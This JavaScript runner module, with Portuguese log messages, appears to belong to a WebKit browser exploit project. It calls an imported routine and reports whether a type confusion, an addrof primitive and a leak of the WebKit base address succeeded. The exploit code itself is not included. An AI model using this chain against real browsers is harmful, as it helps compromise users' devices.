// js/script3/runAllAdvancedTestsS3.mjs (Runner para R55 - Análise de Estado Final)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R55 as executeTest,
    FNAME_MODULE
} from './testArrayBufferVictimCrash.mjs';

async function runStrategy_StateAnalysis_R55() {
    const FNAME_RUNNER = "runStrategy_StateAnalysis_R55";
    logS3(`==== INICIANDO Estratégia (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    
    const result = await executeTest();
    const module_name_for_title = FNAME_MODULE;

    if (!result) {
        document.title = `${module_name_for_title}: Invalid Result Obj`;
        logS3(`  RUNNER R55(StateAnalysis): Objeto de resultado inválido ou nulo.`, "critical", FNAME_RUNNER);
        return;
    }

    if (result.webkit_leak_result?.success) {
        logS3(`  --- SUCESSO FINAL! ---`, "success_major", FNAME_RUNNER);
        logS3(`    Primitiva de ADDROF: ${result.addrof_result?.success ? `CRIADA COM SUCESSO (${result.addrof_result.msg})` : 'FALHOU'}`, "good", FNAME_RUNNER);
        logS3(`    Endereço Base do WebKit Vazado: ${result.webkit_leak_result.webkit_base_candidate}`, "leak", FNAME_RUNNER);
        document.title = "Exploit Sucesso: Base do WebKit Vazada!";
    } else if (result.addrof_result?.success) {
        logS3(`  --- SUCESSO PARCIAL ---`, "vuln", FNAME_RUNNER);
        logS3(`    Primitiva de ADDROF: CRIADA COM SUCESSO.`, "good", FNAME_RUNNER);
        logS3(`    Endereço Vazado: ${result.addrof_result.leaked_object_addr}`, "leak", FNAME_RUNNER);
        logS3(`    Falha no WebKit Leak: ${result.webkit_leak_result?.msg || 'Não executado.'}`, "warn", FNAME_RUNNER);
        document.title = "Exploit Parcial: Addrof OK, WebKitLeak Falhou";
    } else {
        logS3(`  --- FALHA NO TESTE ---`, "critical", FNAME_RUNNER);
        logS3(`    Erro reportado: ${result.errorOccurred || 'Erro desconhecido'}`, "error", FNAME_RUNNER);
        logS3(`    Confusão de Tipos Ocorreu: ${result.tc_confirmed || false}`, "info", FNAME_RUNNER);
        if (result.final_state_analysis) {
             logS3(`    Detalhes da Análise de Estado: ${JSON.stringify(result.final_state_analysis)}`, "leak_detail");
        }
        document.title = "Exploit Falhou: Verifique Logs";
    }

    logS3(`==== Estratégia (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE}_MainOrchestrator`;
    logS3(`==== INICIANDO Script 3 R55_StateAnalysis (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    await runStrategy_StateAnalysis_R55();
    
    logS3(`\n==== Script 3 R55_StateAnalysis (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
}
